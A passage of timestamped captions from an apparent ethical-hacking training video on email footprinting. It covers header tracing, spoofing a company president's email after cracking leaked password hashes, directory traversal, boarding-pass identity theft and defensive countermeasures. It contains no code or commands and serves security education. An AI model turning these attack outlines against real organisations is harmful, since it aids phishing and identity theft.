identified\n\n214\n00:10:31.930 --> 00:10:36.350\na user with a valid email address that\nwe potentially can send email to.\n\n215\n00:10:36.350 --> 00:10:39.240\nIt's got a lot of valuable\ninformation that we can get just from\n\n216\n00:10:39.240 --> 00:10:41.090\nthat one piece alone.\n\n217\n00:10:41.090 --> 00:10:43.480\nNow we can then go back to the other tool,\nright.\n\n218\n00:10:44.550 --> 00:10:46.740\nThe other tool that we're\ngonna go back to and\n\n219\n00:10:46.740 --> 00:10:51.650\ntake a look at here in just a second\non the main page is going to be\n\n220\n00:10:51.650 --> 00:10:55.810\nwhen Mike zooms back in trace email,\nwe're gonna take the host header.\n\n221\n00:10:55.810 --> 00:10:57.010\nThis is why Mike copied it.\n\n222\n00:10:57.010 --> 00:10:59.169\nWe're gonna paste the host header\nin at the bottom of the page.\n\n223\n00:11:00.170 --> 00:11:03.830\nAnd we're gonna be able to\ntake that host header and\n\n224\n00:11:03.830 --> 00:11:08.120\nhave the system graphically map for\nus where that e-mail went to, and\n\n225\n00:11:08.120 --> 00:11:13.620\nessentially do a trace route or a path\nping visually using that host header.\n\n226\n00:11:13.620 --> 00:11:16.530\nAnd it's gonna give us all this\ninformation mapped out for us.\n\n227\n00:11:16.530 --> 00:11:19.720\nThe path the email took, as you can see,\n\n228\n00:11:19.720 --> 00:11:24.505\ntells us the IP address where it\ncame from, spring-chicken.twitter.\n\n229\n00:11:24.505 --> 00:11:30.750\nThe IP Continent and the address,\ncity location, address region, latitude,\n\n230\n00:11:30.750 --> 00:11:34.982\nlongitude, that stuff may or may not be\nimportant, the organization we sent from,\n\n231\n00:11:34.982 --> 00:11:38.410\nand then it gives us some map and\nshows us the path essentially.\n\n232\n00:11:38.410 --> 00:11:41.465\nWe could get a satellite feed\nof it as well as the actual map.\n\n233\n00:11:41.465 --> 00:11:45.830\nYou can just toggle between the two,\nyou can hide or show the map and\n\n234\n00:11:45.830 --> 00:11:50.250\nsee what’s going on there, but then down\nbelow and you can zoom in of course, down\n\n235\n00:11:50.250 --> 00:11:55.510\nbelow we've got information there under\nthe email header by email header analysis.\n\n236\n00:11:55.510 --> 00:11:59.860\nIt breaks down the information for\nus and essentially shows it to us.\n\n237\n00:11:59.860 --> 00:12:02.700\nHighlights it,\nputs some information into context.\n\n238\n00:12:02.700 --> 00:12:06.450\nEssentially just lets us examine\nthe header from another perspective.\n\n239\n00:12:06.450 --> 00:12:11.275\nBut the idea is that again, it's gonna\ngive us a lot of valuable information.\n\n240\n00:12:11.275 --> 00:12:13.890\nNow there are tools out\nthere like visual route,\n\n241\n00:12:13.890 --> 00:12:16.480\nwhich can be used to do\nessentially the same thing.\n\n242\n00:12:16.480 --> 00:12:17.460\nYou gotta buy that tool.\n\n243\n00:12:17.460 --> 00:12:18.570\nIt used to be free at one point.\n\n244\n00:12:18.570 --> 00:12:19.540\nYou gotta buy it.\n\n245\n00:12:19.540 --> 00:12:20.310\nVery great tool.\n\n246\n00:12:20.310 --> 00:12:21.470\nVery powerful.\n\n247\n00:12:21.470 --> 00:12:25.330\nBut it unfortunately costs a lot\nof money these days to license.\n\n248\n00:12:25.330 --> 00:12:28.210\nSo you have sites like\nthis can be used for\n\n249\n00:12:28.210 --> 00:12:33.250\nemail footprinting to again gather\na very large amount of information,\n\n250\n00:12:33.250 --> 00:12:37.020\nbut a small amount in the context of\nthe overall footprinting experience.\n\n251\n00:12:37.020 --> 00:12:38.870\nBut then as Mike has pointed out before,\nand\n\n252\n00:12:38.870 --> 00:12:42.580\nwe've talked about in prior episodes,\nwe use that to aggregate and\n\n253\n00:12:42.580 --> 00:12:47.210\nto link to other pieces of information and\nto tell us that there are pieces\n\n254\n00:12:47.210 --> 00:12:50.110\nof the puzzle that we have to\nbring into sharper focus, right?\n\n255\n00:12:50.110 --> 00:12:51.570\n>> Yep.\nAbsolutely and\n\n256\n00:12:51.570 --> 00:12:54.670\nlooking at that header information I've\nalways learned it's really easy to\n\n257\n00:12:54.670 --> 00:12:58.730\nforge or spoof,\nlike that from field in an email.\n\n258\n00:12:58.730 --> 00:13:02.440\nWhen you're looking at your email\nclient it says it's from so and\n\n259\n00:13:02.440 --> 00:13:05.760\nso at ABC.com that's pretty easy to fake.\n\n260\n00:13:05.760 --> 00:13:08.750\nYou get that header information\nout you can see what servers those\n\n261\n00:13:08.750 --> 00:13:09.780\nare coming out of.\n\n262\n00:13:09.780 --> 00:13:11.970\n>> It is you know if we use\nthe first tool, which we did,\n\n263\n00:13:11.970 --> 00:13:14.620\nwe're not going to go back to, we can stay\nhere, but if we use that first tool on\n\n264\n00:13:14.620 --> 00:13:17.220\nthe site, where we check\nthe validity of an email address and\n\n265\n00:13:17.220 --> 00:13:24.560\nsee that BenSmith@companyx.com\nis a valid email,\n\n266\n00:13:24.560 --> 00:13:29.010\nand we do some cross referencing\nwith social media footprinting and\n\n267\n00:13:29.010 --> 00:13:33.360\nfind that Ben Smith is the president\nof that company, it's not hard to craft\n\n268\n00:13:33.360 --> 00:13:37.470\nfake email packets that make it\nlook like they came from Ben Smith,\n\n269\n00:13:37.470 --> 00:13:40.170\nas I share with you one of my\ncustomers fell prey to that.\n\n270\n00:13:40.170 --> 00:13:42.580\nAnd there are tools out there\nthat will let you do that.\n\n271\n00:13:42.580 --> 00:13:46.430\nYou can actually connect to an email\nserver from a command line, and\n\n272\n00:13:46.430 --> 00:13:50.430\nas long as you can open up a session\nyou can write an entire email if you're\n\n273\n00:13:50.430 --> 00:13:53.860\nan authorized user with the right user\nname and password, you can write an entire\n\n274\n00:13:53.860 --> 00:13:58.730\nemail from a command shell using\nthe SMTP or ESMTP command line toolset.\n\n275\n00:13:58.730 --> 00:14:02.690\nYou don't ever have to, in other words,\nactually get into a graphical client.\n\n276\n00:14:02.690 --> 00:14:05.660\nNow you do have to have a user name and\na password that is authentic.\n\n277\n00:14:05.660 --> 00:14:09.250\nYou have to be able to essentially\nauthenticate right to that server.\n\n278\n00:14:09.250 --> 00:14:13.320\nSo not suggesting just anybody could walk\nup, open up a console and send email.\n\n279\n00:14:13.320 --> 00:14:16.374\nYou have to be able to get the username\nand password, but as we know,\n\n280\n00:14:16.374 --> 00:14:18.894\nwe've talked about and\nwe'll continue to talk about,\n\n281\n00:14:18.894 --> 00:14:21.110\nit may not be that hard\nto find T=that username.\n\n282\n00:14:21.110 --> 00:14:24.050\nAs a matter of fact, by finding email\naddresses we all ready have a sense of\n\n283\n00:14:24.050 --> 00:14:27.920\nusernames, because we know every valid\nemail address more often than not,\n\n284\n00:14:27.920 --> 00:14:33.050\nif it's not an alias for something like\ninfo@company, but rather a user address,\n\n285\n00:14:33.050 --> 00:14:35.256\nwe're gonna know there's a user\naccount associated with that.\n\n286\n00:14:35.256 --> 00:14:38.600\nSo we all ready know in theory\nthat we have valid users and\n\n287\n00:14:38.600 --> 00:14:41.320\nmaybe able to discern their usernames.\n\n288\n00:14:41.320 --> 00:14:42.830\nThe password is usually the tough part.\n\n289\n00:14:42.830 --> 00:14:46.200\nThere are many ways we can go about\ntrying to get those passwords.\n\n290\n00:14:46.200 --> 00:14:48.820\nWe'll talk about some of\nthem in upcoming episodes.\n\n291\n00:14:48.820 --> 00:14:53.520\nBut the idea of being able to dump\nthose hash tables like was done to\n\n292\n00:14:53.520 --> 00:14:56.710\nLinkedIn years ago, like was done to\nTwitter over the last couple of weeks,\n\n293\n00:14:56.710 --> 00:15:01.330\nwhere you can then use rainbow tables and\nlook up the hashes, discern the passwords,\n\n294\n00:15:01.330 --> 00:15:04.990\nmatch them to user accounts,\ndecode that information essentially,\n\n295\n00:15:04.990 --> 00:15:09.210\nhave a user name and a password, you can\nthen open up an SMTP session to a server,\n\n296\n00:15:09.210 --> 00:15:14.980\nand you would then be able to craft\nan email from Ben@company.com\n\n297\n00:15:14.980 --> 00:15:18.960\nas the president saying hey,\nI want you to submit this information.\n\n298\n00:15:18.960 --> 00:15:22.080\nAnd we may not get everybody,\nchances are good we won't, but\n\n299\n00:15:22.080 --> 00:15:26.140\nif we get 10% of the user population\nof a company of a 100 people,\n\n300\n00:15:26.140 --> 00:15:30.290\nwe got 10 people who gave us information\nthat's valuable as a hacker.\n\n301\n00:15:30.290 --> 00:15:31.240\nI don't need everything,\n\n302\n00:15:31.240 --> 00:15:33.930\nI just need enough to get to\nthe next step in other words.\n\n303\n00:15:33.930 --> 00:15:37.840\nAnd if I can do that 10 times against 10\ndifferent companies, and get 10 people at\n\n304\n00:15:37.840 --> 00:15:41.900\nevery company, I've got 100 people's\nidentities that I could go out and assume.\n\n305\n00:15:41.900 --> 00:15:46.290\nThat's a lot of fake credit cards,\nthat's a lot of things I can get up to,\n\n306\n00:15:46.290 --> 00:15:49.130\na lot of disruption I can cause.\n\n307\n00:15:49.130 --> 00:15:51.200\nAnd that's gonna be a major,\nmajor problem.\n\n308\n00:15:51.200 --> 00:15:54.896\nAnd the reality of our world is\nthat it's not hard to do that.\n\n309\n00:15:54.896 --> 00:15:58.382\nMike and I could sit here for\nhalf an hour just using tools and\n\n310\n00:15:58.382 --> 00:16:00.075\ngetting that information.\n\n311\n00:16:00.075 --> 00:16:03.769\nAnd if we really wanted to We\ncould probably get five or\n\n312\n00:16:03.769 --> 00:16:07.052\nsix user accounts and\nprobably break into one or\n\n313\n00:16:07.052 --> 00:16:12.000\nmore companies to find that information\nwithin half an hour to an hour.\n\n314\n00:16:12.000 --> 00:16:15.390\nMaybe even less time depending\non how motivated we were\n\n315\n00:16:15.390 --> 00:16:17.160\njust how quickly we were working.\n\n316\n00:16:17.160 --> 00:16:18.840\nIt would not be hard, in other words,\n\n317\n00:16:18.840 --> 00:16:21.290\nis what I am suggesting to\nyou to be able to do that.\n\n318\n00:16:21.290 --> 00:16:24.540\nAnd you have to understand that,\nas a certified ethical hacker,\n\n319\n00:16:24.540 --> 00:16:27.260\nthat there's a lot of things\nout there that can go wrong.\n\n320\n00:16:27.260 --> 00:16:31.700\nLet's talk about some counter measures\nyou may be able to apply for a minute\n\n321\n00:16:31.700 --> 00:16:35.070\nbefore we show you another tool from\nthe Google tool set that may be helpful.\n\n322\n00:16:35.070 --> 00:16:40.340\nAt the end of the day, anything we talk\nabout with ethical hacking, anything we\n\n323\n00:16:40.340 --> 00:16:44.700\ntalk about in general with security across\nany of the episodes in this program for\n\n324\n00:16:44.700 --> 00:16:49.470\nCH or any of the programs having to\ndo with security here at ITProTV or\n\n325\n00:16:49.470 --> 00:16:52.960\nanywhere in the world as you talk to\nsecurity professionals about security.\n\n326\n00:16:52.960 --> 00:16:54.680\nIt comes down to two\nvery important things.\n\n327\n00:16:54.680 --> 00:16:57.570\nIt comes down to how much\nthe attacker wants it.\n\n328\n00:16:57.570 --> 00:17:01.230\nAnd if they want it badder than you want\nto keep them out, they're gonna get in.\n\n329\n00:17:01.230 --> 00:17:05.340\nAnd we know, just in general,\nit's impossible to keep somebody who is\n\n330\n00:17:05.340 --> 00:17:09.770\ndedicated to doing harm from doing harm if\nthey want to do harm and are not worried\n\n331\n00:17:09.770 --> 00:17:13.740\nabout the outcome to themselves, meaning\nthey're willing to sacrifice themselves.\n\n332\n00:17:13.740 --> 00:17:14.980\nThey will get in.\n\n333\n00:17:14.980 --> 00:17:17.260\nThe question is,\nhow much damage can they do?\n\n334\n00:17:17.260 --> 00:17:21.030\nAnd so what we really have to think about\nis maybe changing our perspective a little\n\n335\n00:17:21.030 --> 00:17:21.850\nbit, right?\n\n336\n00:17:21.850 --> 00:17:24.630\nI'm not suggesting everyday you're gonna\ncome up against dedicated hacker that\n\n337\n00:17:24.630 --> 00:17:27.220\nthe ones who sacrifice themselves and\nget arrested and\n\n338\n00:17:27.220 --> 00:17:29.970\ngo to jail to hack into your email server.\n\n339\n00:17:29.970 --> 00:17:34.590\nBut what I am suggesting is that at some\npoint you may come across somebody who\n\n340\n00:17:34.590 --> 00:17:39.500\nis willing to put more effort into hacking\nthan you are putting into defending.\n\n341\n00:17:39.500 --> 00:17:43.600\nAnd that is not unlikely and what we have\nto think about then as an ethical hacker\n\n342\n00:17:43.600 --> 00:17:45.720\nis how good are my defenses.\n\n343\n00:17:45.720 --> 00:17:46.980\nWe've talked about defense in depth.\n\n344\n00:17:46.980 --> 00:17:51.330\nWe've talked about the value of creating\nmutually overlapping reinforcing layers of\n\n345\n00:17:51.330 --> 00:17:54.870\nprotection that are going\nto mesh together.\n\n346\n00:17:54.870 --> 00:17:59.270\nTo reinforce the controls we put in place,\nso if one of those controls,\n\n347\n00:17:59.270 --> 00:18:01.420\none of those countermeasures fails,\nthere's three or\n\n348\n00:18:01.420 --> 00:18:04.680\nfour others that are there\npotentially to offset that.\n\n349\n00:18:04.680 --> 00:18:07.880\nSo for instance,\nwe may want to restrict employees\n\n350\n00:18:07.880 --> 00:18:13.050\nfrom being able to access social media\nduring work hours with work emails.\n\n351\n00:18:13.050 --> 00:18:17.190\nWe may have a policy that says,\nno use of social media networks, LinkedIn,\n\n352\n00:18:17.190 --> 00:18:18.710\nthings like that, whatever it is.\n\n353\n00:18:18.710 --> 00:18:22.810\nYou cannot use them from work during\nwork hours with a work email alias.\n\n354\n00:18:22.810 --> 00:18:27.680\nIf we find you on there with a work\nemail alias, it's grounds for firing.\n\n355\n00:18:27.680 --> 00:18:30.950\nAnd we may have a policy that very\nclearly makes it an exception\n\n356\n00:18:30.950 --> 00:18:34.950\nwith absolutely no coming back from that\nif you do it you're done, you're gone.\n\n357\n00:18:34.950 --> 00:18:37.500\nNow many companies that use\nsocial media to market,\n\n358\n00:18:37.500 --> 00:18:40.960\nthey use social media to communicate, you\nknow I struggle with this all the time,\n\n359\n00:18:40.960 --> 00:18:45.520\nmy company has this tremendous push\non to get everybody on LinkedIn,\n\n360\n00:18:45.520 --> 00:18:49.350\nto put everybody out there, to have\neverybody have a profile, and they don't.\n\n361\n00:18:49.350 --> 00:18:54.290\nThink about the security implications to\nthis and as a result, we are giving out\n\n362\n00:18:54.290 --> 00:18:57.960\ntremendous amounts of information\nthat may prove to be problematic.\n\n363\n00:18:57.960 --> 00:19:01.510\nI'm not saying that LinkedIn and\nsocial networking sites like that are bad.\n\n364\n00:19:01.510 --> 00:19:05.620\nWhat I'm saying is people's use of them is\nunfortunately not regulated with an eye\n\n365\n00:19:05.620 --> 00:19:10.320\ntowards being appropriate and\ntherefore being security minded and,\n\n366\n00:19:10.320 --> 00:19:13.680\nas a result,\nwe have a lot of usage that opens users up\n\n367\n00:19:13.680 --> 00:19:16.370\nto giving out more information\nthan we feel comfortable.\n\n368\n00:19:16.370 --> 00:19:17.980\nI may wanna connect with you on LinkedIn.\n\n369\n00:19:17.980 --> 00:19:20.250\nI should be able to search your profile,\nnothing wrong with that.\n\n370\n00:19:20.250 --> 00:19:22.280\nI should know who you work for,\nthat's okay.\n\n371\n00:19:22.280 --> 00:19:25.860\nBut I should not know\nthe last 20 things you did,\n\n372\n00:19:25.860 --> 00:19:29.310\nespecially if ten of them are secret and\ninternal to the company.\n\n373\n00:19:29.310 --> 00:19:31.370\nThat's not good stuff to put out there.\n\n374\n00:19:31.370 --> 00:19:34.840\nI shouldn't know you worked on\nthe financials for your company\n\n375\n00:19:34.840 --> 00:19:37.660\nover the last couple of months,\nbecause now we know your budgeting cycle.\n\n376\n00:19:37.660 --> 00:19:42.190\nI shouldn't know that you\njust engage in this IFPO for\n\n377\n00:19:42.190 --> 00:19:46.230\nthis company because now I know that you\nhave a connection of them strategically.\n\n378\n00:19:46.230 --> 00:19:50.090\nI shouldn't know, and I could go on and\non if you get the idea, right.\n\n379\n00:19:50.090 --> 00:19:52.120\nMy point is I don't want\nto read your life online.\n\n380\n00:19:52.120 --> 00:19:57.300\nI don't want to know, it's just not\nall that relevant to me but that's me.\n\n381\n00:19:57.300 --> 00:20:01.120\nI just don't care, but the reality is\nthere's a lot of people out there that do.\n\n382\n00:20:01.120 --> 00:20:05.900\nAnd if you provide that level of\ninformation, you are inviting people\n\n383\n00:20:05.900 --> 00:20:09.845\nto pay attention to you in a way that you\nprobably are gonna be uncomfortable with.\n\n384\n00:20:09.845 --> 00:20:12.775\nConfigure web servers to\nstop information leakage.\n\n385\n00:20:12.775 --> 00:20:17.165\nWe should not be giving out,\nin the host header of a web page via\n\n386\n00:20:17.165 --> 00:20:22.855\na get HTTP request, information about\nthe source OS underlying that web server.\n\n387\n00:20:22.855 --> 00:20:26.415\nYou saw within that craft toolbar,\nwe're able to get that information.\n\n388\n00:20:26.415 --> 00:20:30.155\nThat's because those web servers have\nnot had their host header scrubbed and\n\n389\n00:20:30.155 --> 00:20:35.040\nthe get HTTP request that net craft runs\nallows us to see the operating system.\n\n390\n00:20:35.040 --> 00:20:37.110\nThat's a pretty common\nthing on web servers,\n\n391\n00:20:37.110 --> 00:20:40.440\nit's also pretty stupid thing\nbecause it should not be given out.\n\n392\n00:20:40.440 --> 00:20:44.010\nIt's not because you're gonna give away\nthe farm but it is because you're giving\n\n393\n00:20:44.010 --> 00:20:48.070\nout a very valuable piece of information\nto a hacker that with that knowledge\n\n394\n00:20:48.070 --> 00:20:52.520\ncan then zero in as you saw and as we've\ntalked about looking at hacking databases\n\n395\n00:20:52.520 --> 00:20:56.380\nto find exploits and we showed you\nthey're not that hard to find, right?\n\n396\n00:20:56.380 --> 00:21:00.420\nI mean, a couple of key strokes and Mike\nwas ready to go out and execute an attack\n\n397\n00:21:00.420 --> 00:21:05.400\nagainst one or more servers with the TAC\ncode fully formed sitting on the browser,\n\n398\n00:21:05.400 --> 00:21:08.710\nwaiting, just waiting for\nsomeone to go pick it up and use it.\n\n399\n00:21:08.710 --> 00:21:12.020\nSo, you have to understand that the more\nyou give away, the more likely that\n\n400\n00:21:12.020 --> 00:21:15.360\nsomebody is gonna come and take away\nfrom you, those things that you value.\n\n401\n00:21:15.360 --> 00:21:18.260\nWe should let Kate employees\nto use pseudonym, right.\n\n402\n00:21:18.260 --> 00:21:20.220\nDon't have them use their real\nnames when they go out and\n\n403\n00:21:20.220 --> 00:21:22.770\nthey write blogs they go out and\nthey do postings.\n\n404\n00:21:22.770 --> 00:21:24.730\nI love it when I see people\npost about what they do.\n\n405\n00:21:25.750 --> 00:21:28.730\nI hate it when I see them\npost under their real names.\n\n406\n00:21:28.730 --> 00:21:32.170\nI shouldn't be able to go find Mike's blog\n\n407\n00:21:32.170 --> 00:21:35.080\non a WordPress site that\nlinks him back to ITProTV.\n\n408\n00:21:35.080 --> 00:21:39.350\nI should be able to find a blog that\nmy rights under an alias may or\n\n409\n00:21:39.350 --> 00:21:44.220\nmay not be something I can resolve back to\nthe ITProTV because the reality is if you\n\n410\n00:21:44.220 --> 00:21:47.570\nwrite under pseudonym or\nan alias it's going to be a lot harder for\n\n411\n00:21:47.570 --> 00:21:53.535\nme to understand that that's you know and\nI I say this and I have a blog out there.\n\n412\n00:21:53.535 --> 00:21:56.835\nAnd it's associated with\nthe company I work for.\n\n413\n00:21:56.835 --> 00:21:59.355\nAnd it's sitting out there\noff of one of our web sites.\n\n414\n00:21:59.355 --> 00:22:00.835\nBut that's a decision the company made.\n\n415\n00:22:00.835 --> 00:22:02.425\nAnd they said, hey we want you to blog.\n\n416\n00:22:02.425 --> 00:22:03.925\nWe want you to blog under your name.\n\n417\n00:22:03.925 --> 00:22:05.385\nWe want you to write about stuff.\n\n418\n00:22:05.385 --> 00:22:06.925\nSo I said, okay I'll do that.\n\n419\n00:22:06.925 --> 00:22:07.955\nThat's fine.\n\n420\n00:22:07.955 --> 00:22:10.235\nBut I'm not giving out any\ninformation about what I do,\n\n421\n00:22:10.235 --> 00:22:12.015\nwhere I am and where I go.\n\n422\n00:22:12.015 --> 00:22:16.320\nI'm just talking about topics and\ninformation security and management and\n\n423\n00:22:16.320 --> 00:22:18.360\ninfrastructure and all the stuff I do.\n\n424\n00:22:18.360 --> 00:22:21.410\nSo occasionally I'll throw an article up\nthere about how to install Exchange 2016\n\n425\n00:22:21.410 --> 00:22:23.720\nor whatever that particular thing is.\n\n426\n00:22:23.720 --> 00:22:25.650\nHow to do auto deploy with VMware.\n\n427\n00:22:25.650 --> 00:22:28.550\nWhatever the topic is that\nI'm writing about that month.\n\n428\n00:22:28.550 --> 00:22:30.302\nI say that, and\nI haven't posted in like six months.\n\n429\n00:22:30.302 --> 00:22:31.534\n>> [LAUGH]\n>> As I've been so busy, right.\n\n430\n00:22:31.534 --> 00:22:34.100\nBut the point is, I'll put stuff up there.\n\n431\n00:22:34.100 --> 00:22:35.180\nIt's under my name.\n\n432\n00:22:35.180 --> 00:22:39.070\nBut it's very clearly linked back to\nthe company I work for at New Horizons,\n\n433\n00:22:39.070 --> 00:22:40.380\nthere's no mystery there.\n\n434\n00:22:40.380 --> 00:22:44.180\nYou guys know, if you've seen me on one or\nmore ITProTV shows that I work for\n\n435\n00:22:44.180 --> 00:22:44.850\nNew Horizons.\n\n436\n00:22:44.850 --> 00:22:46.620\nThat's not a surprise to\nanybody that knows me.\n\n437\n00:22:46.620 --> 00:22:48.670\nI've worked there for close to 20 years.\n\n438\n00:22:48.670 --> 00:22:51.340\nIt's on my LinkedIn profile,\nyou can find it there as well.\n\n439\n00:22:51.340 --> 00:22:54.160\nI'm not suggesting that that's\nbad information to give out.\n\n440\n00:22:54.160 --> 00:22:57.460\nWhat I'm suggesting is all the other\nstuff associated with that\n\n441\n00:22:57.460 --> 00:22:58.780\nmay not be as appropriate.\n\n442\n00:22:58.780 --> 00:23:02.080\nThe last five clients I worked for,\nthe last five projects I did,\n\n443\n00:23:02.080 --> 00:23:04.830\nyou're not gonna find any of\nthat information anywhere.\n\n444\n00:23:04.830 --> 00:23:08.370\nI don't talk about any of that stuff\nout on the web, on social media,\n\n445\n00:23:08.370 --> 00:23:12.360\nnone of that stuff gets discussed because\nthat's the kind of stuff hackers can use.\n\n446\n00:23:12.360 --> 00:23:14.310\nThe fact I work for\na company is irrelevant.\n\n447\n00:23:14.310 --> 00:23:16.760\nThe fact that I work for\nother companies is highly relevant,\n\n448\n00:23:16.760 --> 00:23:19.890\nand that's something you can't talk\nabout when you do this kind of work.\n\n449\n00:23:19.890 --> 00:23:23.470\nBecause that's information that can\nget you and the customer in trouble.\n\n450\n00:23:23.470 --> 00:23:25.950\nI usually have to sign NDAs for\nmost of the work I do.\n\n451\n00:23:25.950 --> 00:23:29.180\nI'm not allowed to talk about\nthat stuff even if I wanted to.\n\n452\n00:23:29.180 --> 00:23:31.080\nLegally, I would have a problem and so\n\n453\n00:23:31.080 --> 00:23:33.780\nwould my company if I\nexposed those clients.\n\n454\n00:23:33.780 --> 00:23:36.960\nWhen I talk about them, I generalize\nthe details, you never hear me mention\n\n455\n00:23:36.960 --> 00:23:40.440\na client name In any of our episodes\nalthough I talked about clients I've\n\n456\n00:23:40.440 --> 00:23:43.270\nworked with and client stories all the\ntime, because there's nothing wrong with\n\n457\n00:23:43.270 --> 00:23:47.070\ndoing that as long as I don't expose them\nin a way that will lead to compromise.\n\n458\n00:23:47.070 --> 00:23:50.410\nThat's very important for you as\na certified ethical hacker to think about.\n\n459\n00:23:50.410 --> 00:23:53.630\nWe should limit the amount of\ninformation that's out there.\n\n460\n00:23:53.630 --> 00:23:57.730\nPrevent search engines from\nusing information about you\n\n461\n00:23:57.730 --> 00:23:59.740\nby using anonymous registration services.\n\n462\n00:23:59.740 --> 00:24:01.912\nIn other words, streamline that process.\n\n463\n00:24:01.912 --> 00:24:05.300\nYou guys at ITProTV did the anonymous\nregistration as we saw.\n\n464\n00:24:05.300 --> 00:24:06.154\nFor the name service, right?\n\n465\n00:24:06.154 --> 00:24:06.994\nFor DNS.\n\n466\n00:24:06.994 --> 00:24:09.512\nUse anonymizes, they're very important.\n\n467\n00:24:09.512 --> 00:24:11.666\nEnforce the security policies we have.\n\n468\n00:24:11.666 --> 00:24:14.920\nDisable directory listing\ncapabilities in web servers.\n\n469\n00:24:14.920 --> 00:24:18.590\nDon't allow somebody to use traversal\nattacks to walk through that web server.\n\n470\n00:24:18.590 --> 00:24:19.217\nThat's a problem.\n\n471\n00:24:19.217 --> 00:24:22.080\nWe haven't really shown you that or\ntalked about that with footprinting.\n\n472\n00:24:22.080 --> 00:24:25.020\nWe'll come up against that and\ntalk more about that in upcoming episodes\n\n473\n00:24:25.020 --> 00:24:26.840\nwhen we talk about how to\ndeal with web services.\n\n474\n00:24:26.840 --> 00:24:30.870\nBut there are a group of classification\nattacks out there known as directory\n\n475\n00:24:30.870 --> 00:24:35.420\ntraversal attacks, where you basically\ncan walk the directory of a web server\n\n476\n00:24:35.420 --> 00:24:39.730\nusing a File Explorer web browser if you\nenter the proper set of key strokes.\n\n477\n00:24:39.730 --> 00:24:42.630\nThey're also referred to as dot dot\ndash attacks a lot of the times,\n\n478\n00:24:42.630 --> 00:24:46.390\ncuz that's essentially the format\nwe use to walk the directory.\n\n479\n00:24:46.390 --> 00:24:49.560\nDirectory traversal attacks\ncan be very problematic.\n\n480\n00:24:49.560 --> 00:24:53.897\nAnd if you're not protecting against them,\nyou're essentially inviting somebody who\n\n481\n00:24:53.897 --> 00:24:57.362\nknows better, to come in, access\nthe front-end of your web server and\n\n482\n00:24:57.362 --> 00:25:01.632\nsay, I must be in, if I'm in an IIS\nserver, Inetpub\\wwwroot and then whatever,\n\n483\n00:25:01.632 --> 00:25:04.923\nI go three or four directories down,\nI'm gonna find all the data and\n\n484\n00:25:04.923 --> 00:25:06.761\nall the documentation right there.\n\n485\n00:25:06.761 --> 00:25:09.075\nAnd I can walk through them,\npull up all your files, and\n\n486\n00:25:09.075 --> 00:25:11.449\nI can just make copies of them and\ntake them away from you.\n\n487\n00:25:11.449 --> 00:25:14.462\nAnd more importantly,\ncuz that's not the hard part,\n\n488\n00:25:14.462 --> 00:25:17.555\nwhat's then problematic is\nI can put files in, right?\n\n489\n00:25:17.555 --> 00:25:20.840\nAnd so in other words, I can hack\nthe website and I can put stuff in there.\n\n490\n00:25:20.840 --> 00:25:22.750\nAnd so\nthat's something to consider as well.\n\n491\n00:25:22.750 --> 00:25:25.600\nWe gotta make sure people are educated\nabout social engineering.\n\n492\n00:25:25.600 --> 00:25:28.800\nThings like dumpster diving is a social\nengineering tactic for instance.\n\n493\n00:25:28.800 --> 00:25:32.150\nSo, we may throw away stuff,\nseemingly innocuous stuff,\n\n494\n00:25:32.150 --> 00:25:33.440\nstuff we don't think about.\n\n495\n00:25:33.440 --> 00:25:34.710\nI see this happen all the time.\n\n496\n00:25:34.710 --> 00:25:38.652\nPeople throw away receipts, or they leave\nthem at the bar when they're sitting and\n\n497\n00:25:38.652 --> 00:25:40.526\ndoing something, or in a restaurant.\n\n498\n00:25:40.526 --> 00:25:43.812\nOr I see people leave their boarding\npasses, the paper boarding passes,\n\n499\n00:25:43.812 --> 00:25:47.113\nwhich are less and less common today\ncuz a lot of people use smart devices.\n\n500\n00:25:47.113 --> 00:25:49.891\nBut, if you have a boarding pass and\nyou ever stop and\n\n501\n00:25:49.891 --> 00:25:53.932\ntake a look at what actually is on there,\nyou would be shocked at the amount of\n\n502\n00:25:53.932 --> 00:25:56.730\nthe information that airlines\nput on these things.\n\n503\n00:25:56.730 --> 00:26:00.030\nAnd I see them on the floor in airports,\nI see them on airliners.\n\n504\n00:26:00.030 --> 00:26:02.280\nPeople leave them laying\nthere all the time.\n\n505\n00:26:02.280 --> 00:26:04.907\nAnd again, if I was up to no good,\nI mean it would just,\n\n506\n00:26:04.907 --> 00:26:06.691\nit's like taking candy from a baby.\n\n507\n00:26:06.691 --> 00:26:09.876\n>> [LAUGH]\n>> I mean there's, I could easily,\n\n508\n00:26:09.876 --> 00:26:11.640\neasily become anybody.\n\n509\n00:26:11.640 --> 00:26:14.260\nAnd we're not,\na lot of just average common people fly.\n\n510\n00:26:14.260 --> 00:26:18.430\nBut a lot of people that are business\npeople, that have high profile net worth,\n\n511\n00:26:18.430 --> 00:26:22.610\nfly on airliners going to and\nfrom all sorts of places.\n\n512\n00:26:22.610 --> 00:26:25.380\nAnd if I pull a boarding\npass on one of those people,\n\n513\n00:26:25.380 --> 00:26:30.060\nI have your name, I have your frequent\nflyer number, I have your itinerary.\n\n514\n00:26:30.060 --> 00:26:31.950\nJust with a little bit of\nadditional information,\n\n515\n00:26:31.950 --> 00:26:35.310\nwhich is not hard to cross-reference and\nfind as we showed you, I typically need\n\n516\n00:26:35.310 --> 00:26:39.950\nyour email address as your user name\nto log in to the airline's website.\n\n517\n00:26:39.950 --> 00:26:43.550\nI can get that going to social media,\nthat's not hard to do, right?\n\n518\n00:26:43.550 --> 00:26:47.250\nAnd, with just a little bit of additional\ninformation, I can probably call up and\n\n519\n00:26:47.250 --> 00:26:48.920\nfind out all about you.\n\n520\n00:26:48.920 --> 00:26:52.308\nAnd then I can get your itinerary,\nI can find out where you're going,\n\n521\n00:26:52.308 --> 00:26:55.390\nI may be able to change your itinerary and\nstrand you somewhere.\n\n522\n00:26:55.390 --> 00:26:56.390\nWho knows what I can do?\n\n523\n00:26:56.390 --> 00:26:59.276\nBut I can find out all sorts of stuff\nabout you, it's not hard to do.\n\n524\n00:26:59.276 --> 00:27:02.936\nAnd by giving out that information,\nby just throwing that piece of paper on\n\n525\n00:27:02.936 --> 00:27:06.980\nthe ground and walking away, imagine,\nright, what you're giving away.\n\n526\n00:27:06.980 --> 00:27:10.520\nAnd yet people do this all the time\nwithout even thinking about it, right?\n\n527\n00:27:10.520 --> 00:27:13.980\nSo we talked about using the privacy\nservices on the whois database\n\n528\n00:27:13.980 --> 00:27:15.870\nto strip out the name\nregistration information.\n\n529\n00:27:15.870 --> 00:27:18.270\nWe spoke about that, very important.\n\n530\n00:27:18.270 --> 00:27:21.770\nMake sure you're doing things\nlike encrypting sensitive data,\n\n531\n00:27:21.770 --> 00:27:24.180\nencrypt your passwords, things like 